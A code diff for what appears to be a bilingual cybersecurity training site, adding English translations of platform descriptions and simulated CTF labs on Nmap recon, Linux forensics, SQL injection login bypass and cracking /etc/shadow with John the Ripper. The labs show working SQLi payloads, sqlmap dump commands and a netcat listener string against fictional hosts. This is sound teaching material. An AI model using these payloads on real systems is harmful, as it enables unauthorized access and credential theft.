+  'PentesterLab': { en: { desc:'Hands-on exercises focused on web vulnerabilities and pentesting methodology.', reason:'Teaches the how and why behind each exploit, perfect for consolidating knowledge.', features:['Guided exercises','Progress badges','Methodology-focused','Pro + Free'], lang:'English' } },
+  'CTFChallenge': { en: { desc:'CTF aggregator with calendar, write-ups, and resources for competitors.', reason:'Helps bridge guided learning and real competition.', features:['CTF calendar','Write-ups','Study resources','Active community'], lang:'English', price:'Free' } },
+  'YesWeHack DOJO': { en: { desc:'Bug bounty training with realistic scenarios and professional methodology.', reason:'A bridge between learning and real bug bounty work, with a strong reporting mindset.', features:['Realistic scenarios','Pro methodology','Bug bounty prep','European platform'] } },
+  'VulnHub': { en: { desc:'Repository of vulnerable machines to download and practice locally.', reason:'Requires building your own lab and is ideal for simulating real-world environments.', features:['Downloadable machines','No time limits','Creator community','100% offline'], lang:'English', price:'Free' } },
+  'crAPI (OWASP)': { en: { desc:'Reference vulnerable application for practicing modern API security.', reason:'Focused on REST and GraphQL APIs, and aimed at more advanced architecture work.', features:['Vulnerable APIs','Docker/K8s','OWASP API Top 10','Open source'], price:'Free' } },
+  'Metasploitable 3': { en: { desc:'Vulnerable machine built to test pentesting tools such as Metasploit.', reason:'Complex environment with multiple vulnerable services that requires deeper analysis.', features:['Multiple attack paths','Metasploit integration','Technical docs','Enterprise focus'], lang:'English', price:'Free' } },
+  'APIsec University': { en: { desc:'Specialized API security courses with hands-on labs and certifications.', reason:'Advanced content for professionals working with modern architectures.', features:['Specialized courses','Hands-on labs','Certification','Enterprise focus'], lang:'English' } },
+  'Google CTF': { en: { desc:'Google’s annual CTF with world-class crypto, reversing, and exploit challenges.', reason:'Challenges designed by Google engineers and built for advanced creative thinking.', features:['Elite challenges','Google tech','Official write-ups','Global competition'], lang:'English', price:'Free' } },
+  'Hacking Hub': { en: { desc:'Emerging platform with pentesting labs and advanced certification paths.', reason:'Built for learners who want to specialize in advanced offensive security.', features:['Specialized paths','Realistic labs','Mentorship available','Certification focus'], lang:'English' } },
+};
+
+function getStrings() {
+  return UI_STRINGS[currentLang];
+}
+
+function getLevelName(level) {
+  return getStrings().levelNames[level];
+}
+
+function getLevelLabel(level) {
+  return getStrings().levelLabels[level];
+}
+
+function getPlatformCopy(platform) {
+  if (currentLang === 'es') return platform;
+  const translated = PLATFORM_I18N[platform.name]?.[currentLang];
+  return translated ? { ...platform, ...translated } : platform;
+}
+
+function getLabCopy(lab) {
+  if (currentLang === 'es') return lab;
+  const translated = LAB_I18N[lab.id]?.[currentLang];
+  if (!translated) return lab;
+  return {
+    ...lab,
+    ...translated,
+    theory: translated.theory ? { ...lab.theory, ...translated.theory } : lab.theory,
+    commands: translated.commands ? { ...lab.commands, ...translated.commands } : lab.commands,
+  };
+}
 
 const HACKING_GLYPHS = [
   'nmap -sV','0x41424344','/bin/sh','nc -lvp 4444',
@@ -760,6 +1073,58 @@ const sbBadge   = document.getElementById('sbBadge');
 const sbCmd     = document.getElementById('sbCmd');
 const sbDesc    = document.getElementById('sbDesc');
 const diStatus  = document.getElementById('diStatus');
+const headerSubtitleEl = document.getElementById('headerSubtitle');
+const tooltipActionText = document.getElementById('tooltipActionText');
+const levelPanelBeginner = document.getElementById('levelPanelBeginner');
+const levelPanelIntermediate = document.getElementById('levelPanelIntermediate');
+const levelPanelAdvanced = document.getElementById('levelPanelAdvanced');
+const legendBeginner = document.getElementById('legendBeginner');
+const legendIntermediate = document.getElementById('legendIntermediate');
+const legendAdvanced = document.getElementById('legendAdvanced');
+const sceneHintEl = document.getElementById('sceneHint');
+const btnInfo = document.getElementById('btnInfo');
+const controlsRoot = document.querySelector('.controls');
+const btnMenu = document.getElementById('btnMenu');
+const controlMenu = document.getElementById('controlMenu');
+const btnPdf = document.getElementById('btnPdf');
+const btnReset = document.getElementById('btnReset');
+const btnAuto = document.getElementById('btnAuto');
+const btnDragon = document.getElementById('btnDragon');
+const btnLab = document.getElementById('btnLab');
+const pvDescLabel = document.getElementById('pvDescLabel');
+const pvReasonLabel = document.getElementById('pvReasonLabel');
+const pvFeaturesLabel = document.getElementById('pvFeaturesLabel');
+const pvMetaLabel = document.getElementById('pvMetaLabel');
+const pvDomainLabel = document.getElementById('pvDomainLabel');
+const pvTypeLabel = document.getElementById('pvTypeLabel');
+const pvLangLabel = document.getElementById('pvLangLabel');
+const pvPriceLabel = document.getElementById('pvPriceLabel');
+const pvVisitText = document.getElementById('pvVisitText');
+const pdfTitle = document.getElementById('pdfTitle');
+const pdfIntro = document.getElementById('pdfIntro');
+const pdfOpenText = document.getElementById('pdfOpenText');
+const pdfDownloadText = document.getElementById('pdfDownloadText');
+const labModalTitle = document.getElementById('labModalTitle');
+const theorySubtitle = document.getElementById('theorySubtitle');
+const theoryLearnLabel = document.getElementById('theoryLearnLabel');
+const theoryPointsLabel = document.getElementById('theoryPointsLabel');
+const theoryToolsLabel = document.getElementById('theoryToolsLabel');
+const theoryWhyLabel = document.getElementById('theoryWhyLabel');
+const theoryStartText = document.getElementById('theoryStartText');
+const theoryToggleBtn = document.getElementById('theoryToggleBtn');
+const theoryToggleText = document.getElementById('theoryToggleText');
+const labRunText = document.getElementById('labRunText');
+const labInputEl = document.getElementById('labInput');
+const labHintBtn = document.getElementById('labHint');
+const labResetBtn = document.getElementById('labReset');
+const langButtons = document.querySelectorAll('.lang-btn');
+const levelOverlay = document.getElementById('levelOverlay');
+const levelModalCard = document.getElementById('levelModalCard');
+const previewOverlay = document.getElementById('previewOverlay');
+const pdfOverlay = document.getElementById('pdfOverlay');
+let activePreviewPlatform = null;
+let lastPointer = { x: W / 2, y: H / 2 };
+let dragonStatusInteracted = false;
 
 function showSpeech(platform, screenX, screenY) {}
 
@@ -773,11 +1138,108 @@ function worldToScreen(v3) {
   return { x:(v.x+1)/2*W, y:(-v.y+1)/2*H };
 }
 
+function updateDragonStatus() {
+  const s = getStrings();
+  if (!dragonStatusInteracted) {
+    diStatus.textContent = s.dragonBoot;
+    return;
+  }
+  diStatus.textContent = dragonEnabled ? s.dragonPatrol : s.dragonStealth;
+}
+
+function renderLevelModal() {
+  const s = getStrings();
+  const audienceLabel = currentLang === 'es' ? '¿Para quién?' : 'Who is it for?';
+  const findingLabel = currentLang === 'es' ? '¿Qué encontrarás?' : 'What will you find?';
+  levelModalCard.innerHTML = `
+    <div class="modal-header">
+      <h2><i class="fa-solid fa-chart-simple" style="color:#00ff88;font-size:22px"></i> ${s.levelModalTitle}</h2>
+      <button class="modal-close" id="closeLevelModal"><i class="fa-solid fa-xmark" style="font-size:16px"></i></button>
+    </div>
+    ${s.levelCards.map((card, idx) => `
+      <div class="level-card" style="border-left:3px solid ${LEVEL_COLORS[idx]}">
+        <h3><span class="dot" style="background:${LEVEL_COLORS[idx]}"></span><span style="color:${LEVEL_COLORS[idx]}">${card.title}</span></h3>
+        <p><strong style="color:#c0c0d0">${audienceLabel}</strong> ${card.audience}</p>
+        <p><strong style="color:#c0c0d0">${findingLabel}</strong> ${card.finding}</p>
+        <ul>${card.bullets.map(item => `<li>${item}</li>`).join('')}</ul>
+      </div>
+    `).join('')}
+  `;
+  document.getElementById('closeLevelModal').addEventListener('click', () => levelOverlay.classList.remove('active'));
+}
+
+function refreshLanguageButtons() {
+  langButtons.forEach(button => button.classList.toggle('active', button.dataset.lang === currentLang));
+}
+
+function applyLanguage() {
+  const s = getStrings();
+  document.documentElement.lang = currentLang;
+  document.title = s.pageTitle;
+  headerSubtitleEl.textContent = s.headerSubtitle;
+  tooltipActionText.textContent = s.tooltipAction;
+  levelPanelBeginner.textContent = s.levelLabels[0];
+  levelPanelIntermediate.textContent = s.levelLabels[1];
+  levelPanelAdvanced.textContent = s.levelLabels[2];
+  legendBeginner.textContent = s.levelLabels[0];
+  legendIntermediate.textContent = s.levelLabels[1];
+  legendAdvanced.textContent = s.levelLabels[2];
+  sceneHintEl.textContent = s.hint;
+  btnInfo.title = s.controls.info;
+  btnMenu.title = currentLang === 'en' ? 'Open menu' : 'Abrir menu';
+  btnMenu.setAttribute('aria-label', btnMenu.title);
+  btnPdf.title = s.controls.pdf;
+  btnReset.title = s.controls.reset;
+  btnAuto.title = s.controls.auto;
+  btnDragon.title = s.controls.dragon;
+  btnLab.title = s.controls.lab;
+  pvDescLabel.textContent = s.preview.description;
+  pvReasonLabel.textContent = s.preview.reason;
+  pvFeaturesLabel.textContent = s.preview.features;
+  pvMetaLabel.textContent = s.preview.meta;
+  pvDomainLabel.textContent = s.preview.domain;
+  pvTypeLabel.textContent = s.preview.type;
+  pvLangLabel.textContent = s.preview.language;
+  pvPriceLabel.textContent = s.preview.price;
+  pvVisitText.textContent = s.preview.visit;
+  pdfTitle.textContent = s.pdf.title;
+  pdfIntro.textContent = s.pdf.intro;
+  pdfOpenText.textContent = s.pdf.open;
+  pdfDownloadText.textContent = s.pdf.download;
+  labModalTitle.textContent = s.lab.title;
+  theorySubtitle.textContent = s.lab.theorySubtitle;
+  theoryLearnLabel.textContent = s.lab.theoryLearn;
+  theoryPointsLabel.textContent = s.lab.theoryPoints;
+  theoryToolsLabel.textContent = s.lab.theoryTools;
+  theoryWhyLabel.textContent = s.lab.theoryWhy;
+  theoryStartText.textContent = s.lab.theoryStart;
+  theoryToggleBtn.title = s.lab.theoryToggleTitle;
+  theoryToggleText.textContent = s.lab.theoryToggle;
+  labInputEl.placeholder = s.lab.inputPlaceholder;
+  labRunText.textContent = s.lab.run;
+  labHintBtn.title = s.lab.hintTitle;
+  labResetBtn.title = s.lab.resetTitle;
+  renderLevelModal();
+  refreshLanguageButtons();
+  updateDragonStatus();
+  renderSidebar();
+  if (hovered) handleHover(lastPointer.x, lastPointer.y);
+  if (activePreviewPlatform) showPlatformPreview(activePreviewPlatform);
+  if (currentLab) loadLab(currentLab);
+}
+
+/* Hover / click */
+const raycaster=new THREE.Raycaster();
+const mouseVec=new THREE.Vector2();
+const tooltip=document.getElementById('tooltip');
+let hovered=null;
+
 /* =====================================================================
    CÁMARA Y CONTROLES
    ===================================================================== */
 let zoomF=1.0; const MIN_Z=0.85,MAX_Z=1.15;
 let autoRotate=false;
+let controlsMenuOpen=false;
 const sph={theta:Math.PI*0.22,phi:0.82};
 const CAM_R=55;
 
@@ -800,39 +1262,60 @@ renderer.domElement.addEventListener('touchstart',e=>{if(e.touches.length===1){p
 renderer.domElement.addEventListener('touchmove',e=>{if(!prevT||e.touches.length!==1)return;const dx=e.touches[0].clientX-touchStartPos.x,dy=e.touches[0].clientY-touchStartPos.y;if(Math.sqrt(dx*dx+dy*dy)>8)touchMoved=true;sph.theta-=(e.touches[0].clientX-prevT.x)*0.008;sph.phi=Math.max(0.3,Math.min(1.3,sph.phi-(e.touches[0].clientY-prevT.y)*0.008));prevT={x:e.touches[0].clientX,y:e.touches[0].clientY};applyCam();handleHover(e.touches[0].clientX,e.touches[0].clientY);e.preventDefault();},{passive:false});
 renderer.domElement.addEventListener('touchend',e=>{if(!touchMoved&&hovered&&e.changedTouches.length===1){showPlatformPreview(hovered);}touchStartPos=null;},{passive:true});
 
-document.getElementById('btnReset').addEventListener('click',()=>{sph.theta=Math.PI*0.22;sph.phi=0.82;zoomF=1.0;applyCam();});
-const autoBtn=document.getElementById('btnAuto');
-autoBtn.addEventListener('click',()=>{autoRotate=!autoRotate;document.getElementById('autoIcon').className=autoRotate?'fa-solid fa-pause':'fa-solid fa-play';autoBtn.classList.toggle('active',autoRotate);});
-document.getElementById('btnDragon').addEventListener('click',()=>{
+function setControlsMenuOpen(open){
+  controlsMenuOpen=open;
+  controlMenu.classList.toggle('open',open);
+  btnMenu.classList.toggle('active',open);
+  btnMenu.setAttribute('aria-expanded',open?'true':'false');
+}
+
+btnMenu.addEventListener('click',e=>{
+  e.stopPropagation();
+  setControlsMenuOpen(!controlsMenuOpen);
+});
+controlMenu.addEventListener('click',e=>e.stopPropagation());
+document.addEventListener('click',e=>{if(!controlsRoot.contains(e.target))setControlsMenuOpen(false);});
+
+btnReset.addEventListener('click',()=>{sph.theta=Math.PI*0.22;sph.phi=0.82;zoomF=1.0;applyCam();});
+btnAuto.addEventListener('click',()=>{autoRotate=!autoRotate;document.getElementById('autoIcon').className=autoRotate?'fa-solid fa-pause':'fa-solid fa-play';btnAuto.classList.toggle('active',autoRotate);});
+btnDragon.addEventListener('click',()=>{
   dragonEnabled=!dragonEnabled;
   dragonSVGEl.style.display = dragonEnabled ? '' : 'none';
   if(!dragonEnabled) hideSpeech();
-  document.getElementById('btnDragon').classList.toggle('active',dragonEnabled);
-  diStatus.textContent=dragonEnabled?'Patrullando la red...':'En modo stealth...';
+  dragonStatusInteracted = true;
+  btnDragon.classList.toggle('active',dragonEnabled);
+  updateDragonStatus();
 });
-
-const levelOverlay=document.getElementById('levelOverlay');
-document.getElementById('btnInfo').addEventListener('click',()=>levelOverlay.classList.add('active'));
-document.getElementById('closeLevelModal').addEventListener('click',()=>levelOverlay.classList.remove('active'));
+langButtons.forEach(button => {
+  button.addEventListener('click', () => {
+    if (button.dataset.lang === currentLang) return;
+    currentLang = button.dataset.lang;
+    localStorage.setItem(LANG_STORAGE_KEY, currentLang);
+    applyLanguage();
+  });
+});
+btnInfo.addEventListener('click',()=>levelOverlay.classList.add('active'));
 levelOverlay.addEventListener('click',e=>{if(e.target===levelOverlay)levelOverlay.classList.remove('active');});
-const previewOverlay=document.getElementById('previewOverlay');
-document.getElementById('closePreview').addEventListener('click',()=>previewOverlay.classList.remove('active'));
-previewOverlay.addEventListener('click',e=>{if(e.target===previewOverlay)previewOverlay.classList.remove('active');});
+document.getElementById('closePreview').addEventListener('click',()=>{activePreviewPlatform=null;previewOverlay.classList.remove('active');});
+previewOverlay.addEventListener('click',e=>{if(e.target===previewOverlay){activePreviewPlatform=null;previewOverlay.classList.remove('active');}});
+btnPdf.addEventListener('click',()=>pdfOverlay.classList.add('active'));
+document.getElementById('closePdf').addEventListener('click',()=>pdfOverlay.classList.remove('active'));
+pdfOverlay.addEventListener('click',e=>{if(e.target===pdfOverlay)pdfOverlay.classList.remove('active');});
+[btnPdf,btnReset,btnAuto,btnDragon,btnLab].forEach(btn=>btn.addEventListener('click',()=>setControlsMenuOpen(false)));
 
-/* Hover / click */
-const raycaster=new THREE.Raycaster();const mouseVec=new THREE.Vector2();
-const tooltip=document.getElementById('tooltip');let hovered=null;
 function handleHover(cx,cy){
+  lastPointer = { x: cx, y: cy };
   const rect=renderer.domElement.getBoundingClientRect();
   mouseVec.x=((cx-rect.left)/rect.width)*2-1;
   mouseVec.y=-((cy-rect.top)/rect.height)*2+1;
   raycaster.setFromCamera(mouseVec,camera);
   const hits=raycaster.intersectObjects(hitObjects);
   if(hits.length>0){
-    const{platform,idx}=hits[0].object.userData; hovered=platform;
-    document.getElementById('ttNum').textContent=`PLATAFORMA #${String(idx+1).padStart(2,'0')}`;
+    const{platform:rawPlatform,idx}=hits[0].object.userData; hovered=rawPlatform;
+    const platform = getPlatformCopy(rawPlatform);
+    document.getElementById('ttNum').textContent=getStrings().platformLabel(String(idx+1).padStart(2,'0'));
     document.getElementById('ttName').textContent=platform.name;
-    const badge=document.getElementById('ttBadge');badge.textContent=LEVEL_NAMES[platform.level];badge.style.background=LEVEL_COLORS[platform.level]+'22';badge.style.color=LEVEL_COLORS[platform.level];
+    const badge=document.getElementById('ttBadge');badge.textContent=getLevelName(platform.level);badge.style.background=LEVEL_COLORS[platform.level]+'22';badge.style.color=LEVEL_COLORS[platform.level];
     document.getElementById('ttUrl').textContent=platform.domain;
     document.getElementById('ttDesc').textContent=platform.desc;
     document.getElementById('ttFeatures').innerHTML=platform.features.map(f=>`<span>${f}</span>`).join('');
@@ -845,9 +1328,11 @@ function handleHover(cx,cy){
   }
 }
 renderer.domElement.addEventListener('click',e=>{if(hovered){e.preventDefault();showPlatformPreview(hovered);}});
-function showPlatformPreview(p){
+function showPlatformPreview(rawPlatform){
+  activePreviewPlatform = rawPlatform;
+  const p = getPlatformCopy(rawPlatform);
   document.getElementById('pvName').textContent=p.name;
-  const badge=document.getElementById('pvBadge');badge.textContent=LEVEL_NAMES[p.level];badge.style.background=LEVEL_COLORS[p.level]+'22';badge.style.color=LEVEL_COLORS[p.level];
+  const badge=document.getElementById('pvBadge');badge.textContent=getLevelName(p.level);badge.style.background=LEVEL_COLORS[p.level]+'22';badge.style.color=LEVEL_COLORS[p.level];
   document.getElementById('pvDesc').textContent=p.desc;document.getElementById('pvReason').textContent=p.reason;
   document.getElementById('pvFeatures').innerHTML=p.features.map(f=>`<li>${f}</li>`).join('');
   document.getElementById('pvDomain').textContent=p.domain;document.getElementById('pvType').textContent=p.type;
@@ -1276,6 +1761,292 @@ john:x:1001:1001::/home/john:/bin/bash`,
   }
 ];
 
+const LAB_I18N = {
+  recon01: {
+    en: {
+      title: 'Recon with Nmap',
+      difficulty: 'BEGINNER',
+      theory: {
+        concept: 'Reconnaissance is the first phase of any penetration test. The goal is to collect information about the target: which ports are open, which services are running, and which versions they use. Nmap is the industry-standard tool for this stage.',
+        points: [
+          'A <strong style="color:#e0e0e8">port</strong> is like a numbered door on a server. Every service listens on one (for example: HTTP → 80, SSH → 22).',
+          'A <strong style="color:#e0e0e8">port scan</strong> checks which of those doors are open and responding.',
+          'With <strong style="color:#e0e0e8">-sV</strong> Nmap tries to identify the exact software and version behind each service.',
+          'With <strong style="color:#e0e0e8">-sC</strong> it runs basic detection scripts that can reveal insecure configurations.',
+          'The collected information lets you plan the next step of the attack or audit.',
+        ],
+        tools: [
+          { cmd:'nmap <ip>', desc:'Basic scan — the 1000 most common ports' },
+          { cmd:'nmap -sV <ip>', desc:'Detect service versions' },
+          { cmd:'nmap -sV -sC <ip>', desc:'Versions + default detection scripts' },
+          { cmd:'curl http://<ip>:<port>', desc:'Send a manual HTTP request to inspect the web service' },
+        ],
+        why: 'Most intrusions begin with recon. An exposed service without authentication, like the admin panel in this challenge, can lead to full compromise. Pentesters and attackers both start here.',
+      },
+      desc: 'You have access to an internal network. Your goal is to discover which services are running on host 10.10.10.5 and find the hidden flag.',
+      objectives: ['Scan open ports', 'Identify service versions', 'Find the flag on the right port'],
+      hints: ['Use nmap -sV to detect versions', 'Port 8080 may hide something interesting', 'Try curl against the port you find open'],
+      startMsg: `<span style="color:#a78bfa">╔══ MISSION: Network Recon ══╗</span>
+<span style="color:#606070">Target IP : </span><span style="color:#00ff88">10.10.10.5</span>
+<span style="color:#606070">Your IP   : </span><span style="color:#00ff88">10.10.14.3</span>
+<span style="color:#606070">Goal      : </span><span style="color:#e0e0e8">Find the hidden flag</span>
+<span style="color:#505060">─────────────────────────────────────</span>
+<span style="color:#808090">Tip: start with a basic Nmap scan</span>`,
+      commands: {
+        'nmap -sV 10.10.10.5': `Starting Nmap 7.94 ( https://nmap.org )
+PORT     STATE SERVICE  VERSION
+<span style="color:#00ff88">22/tcp   open  ssh      OpenSSH 8.2p1</span>
+<span style="color:#00ff88">80/tcp   open  http     Apache 2.4.41</span>
+<span style="color:#00ff88">8080/tcp open  http     Node.js Express</span>
+<span style="color:#ff9500">→ Port 8080 looks like an admin panel</span>`,
+        'nmap -sV -sC 10.10.10.5': `PORT     STATE SERVICE  VERSION
+<span style="color:#00ff88">22/tcp   open  ssh      OpenSSH 8.2p1</span>
+<span style="color:#00ff88">80/tcp   open  http     Apache 2.4.41</span>
+| http-title: CyberCorp — Login
+<span style="color:#00ff88">8080/tcp open  http     Node.js Express</span>
+| http-title: Admin Panel — NO AUTH REQUIRED
+<span style="color:#ff5555">⚠ Admin panel exposed without authentication</span>`,
+        'curl http://10.10.10.5:8080': `{"status":"ok","app":"CyberCorp Admin v1.2","endpoints":["/status","/users","/flag"]}
+<span style="color:#ff9500">→ There is an interesting /flag endpoint...</span>`,
+        'curl http://10.10.10.5:8080/flag': `<span style="color:#00ff88">✔ FLAG FOUND!</span>
+<span style="color:#a78bfa">╔═══════════════════════════════╗</span>
+<span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{nmap_reveals_all_5ec3t}</span>  <span style="color:#a78bfa">║</span>
+<span style="color:#a78bfa">╚═══════════════════════════════╝</span>
+<span style="color:#808090">+150 XP — Mission complete 🎯</span>`,
+        help: `Available commands in this challenge:
+  nmap [options] &lt;ip&gt;   — scan ports
+  curl &lt;url&gt;            — send an HTTP request
+  hint                  — ask for a hint`,
+      },
+    },
+  },
+  linux01: {
+    en: {
+      difficulty: 'BEGINNER',
+      theory: {
+        concept: 'Linux is the dominant operating system across servers, IoT devices, and embedded systems. For cybersecurity professionals, command-line fluency is foundational — both for attacking and defending systems.',
+        points: [
+          '<strong style="color:#e0e0e8">ls</strong> lists files. With <strong style="color:#e0e0e8">-la</strong> it also shows hidden files (those starting with ".").',
+          '<strong style="color:#e0e0e8">cat</strong> prints a file’s contents on screen.',
+          '<strong style="color:#e0e0e8">find</strong> searches the filesystem by name, permissions, or type.',
+          'Hidden files and the <strong style="color:#e0e0e8">.bash_history</strong> file often reveal attacker activity.',
+          '<strong style="color:#e0e0e8">base64 -d</strong> decodes Base64-encoded text, a common way to obfuscate data.',
+        ],
+        tools: [
+          { cmd:'ls -la', desc:'List files including hidden ones and permissions' },
+          { cmd:'cat <file>', desc:'Print file contents' },
+          { cmd:'find / -name "*.txt" 2>/dev/null', desc:'Search for every .txt file while suppressing permission errors' },
+          { cmd:'base64 -d <file>', desc:'Decode Base64 content' },
+        ],
+        why: 'When an attacker compromises a Linux server, they often leave traces: hidden files, command history, and notes. Knowing how to navigate the filesystem helps both forensic work and flag hunting in labs and CTFs.',
+      },
+      desc: 'You are inside a compromised Linux server. The attacker left a flag somewhere in the filesystem. Find it using basic Linux commands.',
+      objectives: ['Explore the filesystem', 'Look for hidden or suspicious files', 'Read the flag'],
+      hints: ['Use ls -la to show hidden files', 'find can search by filename', '.txt files often contain flags', 'Check /home and /tmp'],
+      startMsg: `<span style="color:#ff5555">╔══ ROOT ACCESS OBTAINED ══╗</span>
+<span style="color:#606070">Host    : </span><span style="color:#e0e0e8">victim-server</span>
+<span style="color:#606070">User    : </span><span style="color:#ff5555">root</span>
+<span style="color:#606070">OS      : </span><span style="color:#e0e0e8">Ubuntu 20.04 LTS</span>
+<span style="color:#505060">─────────────────────────────</span>
+<span style="color:#808090">The attacker left something here. Find it.</span>`,
+      commands: {
+        'cat flag.txt.enc': `<span style="color:#ff9500">RkxBR3tsaW51eF9iYXNpY3NfMHduM2R9Cg==</span>
+<span style="color:#808090">(looks like Base64...)</span>`,
+        'base64 -d flag.txt.enc': `<span style="color:#00ff88">✔ FLAG FOUND!</span>
+<span style="color:#a78bfa">╔═══════════════════════════════════╗</span>
+<span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{linux_basics_0wn3d}</span>         <span style="color:#a78bfa">║</span>
+<span style="color:#a78bfa">╚═══════════════════════════════════╝</span>
+<span style="color:#808090">+120 XP — Nice work!</span>`,
+        'cat /tmp/.hidden_flag': `<span style="color:#808090"># backup — just in case</span>
+<span style="color:#00ff88">✔ ALT FLAG FOUND!</span>
+<span style="color:#ff9500">FLAG{linux_basics_0wn3d}</span>
+<span style="color:#808090">+120 XP</span>`,
+        'cat .secret/notes.md': `TODO:
+- Clean auth logs (/var/log/auth.log)
+- Delete payload from /tmp
+- Move the flag somewhere safer`,
+        help: `Available commands:
+  ls [path]              — list files
+  ls -la [path]          — list including hidden files
+  cat &lt;file&gt;             — read a file
+  find / -name &lt;pattern&gt; — search for files
+  base64 -d &lt;file&gt;       — decode Base64
+  hint                   — ask for a hint`,
+      },
+    },
+  },
+  sqli01: {
+    en: {
+      difficulty: 'INTERMEDIATE',
+      theory: {
+        concept: 'SQL Injection is one of the oldest and still most common web vulnerabilities. It appears when an application inserts user input directly into an SQL query without validation, allowing the attacker to change database logic.',
+        points: [
+          'A typical login query looks like <code style="color:#a78bfa">SELECT * FROM users WHERE user=\'INPUT\' AND pass=\'INPUT\'</code>.',
+          'If you enter <strong style="color:#e0e0e8">admin\' --</strong>, the <strong style="color:#e0e0e8">--</strong> comments out the rest of the query and ignores the password.',
+          '<strong style="color:#e0e0e8">OR \'1\'=\'1\'</strong> is always true, making the WHERE clause always succeed.',
+          'SQLMap automates SQLi discovery and exploitation: it can enumerate databases, tables, and dump data.',
+          'The OWASP Top 10 has listed SQL Injection among the most critical vulnerabilities for years.',
+        ],
+        tools: [
+          { cmd:"curl -X POST <url> -d \"user=admin'--&pass=x\"", desc:'Manual login bypass with an SQL comment' },
+          { cmd:"curl -X POST <url> -d \"user=' OR '1'='1'--&pass=x\"", desc:'Full bypass — always true condition' },
+          { cmd:'sqlmap -u <url> --data="user=x&pass=x" --dbs', desc:'SQLMap: detect SQLi and enumerate databases' },
+          { cmd:'sqlmap ... -D <db> -T <table> --dump', desc:'Dump the selected table' },
+        ],
+        why: 'SQLi can provide full database access: passwords, user records, and financial data. Every developer and pentester should understand both how it works and how to prevent it with parameterized queries.',
+      },
+      desc: 'A web application exposes a vulnerable login panel. Use SQL Injection to bypass authentication and gain administrator access.',
+      objectives: ['Identify the injection point', 'Bypass the login with SQLi', 'Extract the flag from the database'],
+      hints: ['Try using \' OR \'1\'=\'1 in the username field', 'The password field is vulnerable too', 'Use -- to comment out the rest of the query', 'UNION SELECT can extract data from other tables'],
+      startMsg: `<span style="color:#ff9500">╔══ MISSION: SQL Injection ══╗</span>
+<span style="color:#606070">Target  : </span><span style="color:#e0e0e8">http://vuln-app.local/login</span>
+<span style="color:#606070">Stack   : </span><span style="color:#e0e0e8">PHP + MySQL</span>
+<span style="color:#505060">──────────────────────────────────────</span>
+<span style="color:#808090">Original query: SELECT * FROM users WHERE</span>
+<span style="color:#808090">  username='INPUT' AND password='INPUT'</span>`,
+      commands: {
+        "curl -X POST http://vuln-app.local/login -d \"user=admin'&pass=x\"": `<span style="color:#ff9500">{"error":"You have an error in your SQL syntax..."}</span>
+<span style="color:#00ff88">→ SQL error! This parameter is vulnerable to SQLi</span>`,
+        "curl -X POST http://vuln-app.local/login -d \"user=admin' --&pass=x\"": `<span style="color:#00ff88">{"success":true,"user":"admin","role":"superadmin"}</span>
+<span style="color:#ff9500">→ Login bypassed. Executed query:</span>
+<span style="color:#505060">SELECT * FROM users WHERE username='admin' --' AND password='x'</span>`,
+        "curl -X POST http://vuln-app.local/login -d \"user=' OR '1'='1' --&pass=x\"": `<span style="color:#00ff88">{"success":true,"user":"admin","role":"superadmin","token":"eyJ..."}</span>
+<span style="color:#ff9500">→ Authentication fully bypassed</span>`,
+        "curl http://vuln-app.local/flags -H \"Authorization: eyJ...\"": `<span style="color:#00ff88">✔ FLAG FOUND!</span>
+<span style="color:#a78bfa">╔════════════════════════════════════════╗</span>
+<span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{sql1_byp4ss_auth_m4st3r}</span>         <span style="color:#a78bfa">║</span>
+<span style="color:#a78bfa">╚════════════════════════════════════════╝</span>
+<span style="color:#808090">+200 XP — Intermediate level cleared 🔥</span>`,
+        "sqlmap -u http://vuln-app.local/login --data='user=admin&pass=x' -D webapp_db -T flags --dump": `Database: webapp_db
+Table: flags
++----+----------------------------------+
+| id | flag                             |
++----+----------------------------------+
+| 1  | <span style="color:#ff9500">FLAG{sql1_byp4ss_auth_m4st3r}</span>  |
++----+----------------------------------+
+<span style="color:#00ff88">✔ FLAG RETRIEVED WITH SQLMAP! +200 XP</span>`,
+        help: `Available commands:
+  curl -X POST &lt;url&gt; -d "param=val"  — send a POST request
+  curl &lt;url&gt; -H "Header: val"        — send a request with headers
+  sqlmap -u &lt;url&gt; --data=&lt;params&gt;    — automate SQLi
+  hint                                — ask for a hint`,
+      },
+    },
+  },
+  hash01: {
+    en: {
+      difficulty: 'INTERMEDIATE',
+      theory: {
+        concept: 'Linux systems do not store passwords in plain text. Instead, they store cryptographic hashes in /etc/shadow. A hash is one-way: the same input always produces the same output, but you cannot reverse it directly. Cracking means testing many candidate passwords until one produces the same hash.',
+        points: [
+          '<strong style="color:#e0e0e8">/etc/shadow</strong> stores password hashes for system users.',
+          'SHA-512 Crypt ($6$...) is the standard algorithm on many modern Linux systems.',
+          '<strong style="color:#e0e0e8">Dictionary attacks</strong> test passwords from known wordlists. <strong style="color:#e0e0e8">rockyou.txt</strong> contains millions of real leaked passwords.',
+          '<strong style="color:#e0e0e8">John the Ripper</strong> is a classic tool that supports hundreds of hash formats.',
+          'A weak password such as "admin123" can fall in seconds; a strong random password may take years.',
+        ],
+        tools: [
+          { cmd:'hash-identifier', desc:'Identify the algorithm of an unknown hash' },
+          { cmd:'john shadow --wordlist=/usr/share/wordlists/rockyou.txt', desc:'Run a dictionary attack with rockyou' },
+          { cmd:'john shadow --show', desc:'Show already cracked hashes' },
+          { cmd:'ssh user@ip', desc:'Connect with the credentials you recovered' },
+        ],
+        why: 'Grabbing /etc/shadow is a classic post-exploitation step on Linux. If passwords are weak, cracking them enables lateral movement and privilege escalation. Understanding this is a strong case for long passwords and MFA.',
+      },
+      desc: 'You recovered the /etc/shadow file from a server. Crack the password hashes with John the Ripper and use the credentials to access the system.',
+      objectives: ['Identify the hash type', 'Crack the hash with a wordlist', 'Use the credentials over SSH'],
+      hints: ['Use hash-identifier to guess the type', 'John can use rockyou.txt as a wordlist', 'After cracking it, connect over SSH', 'Look for interesting files once you are inside'],
+      startMsg: `<span style="color:#ff5555">╔══ MISSION: Hash Cracking ══╗</span>
+<span style="color:#606070">Recovered file : </span><span style="color:#e0e0e8">/etc/shadow</span>
+<span style="color:#606070">SSH target     : </span><span style="color:#e0e0e8">10.10.10.8:22</span>
+<span style="color:#505060">──────────────────────────────────</span>
+<span style="color:#808090">You have the shadow file. Crack it.</span>`,
+      commands: {
+        'hash-identifier': `<span style="color:#a78bfa">Hash Identifier v1.2</span>
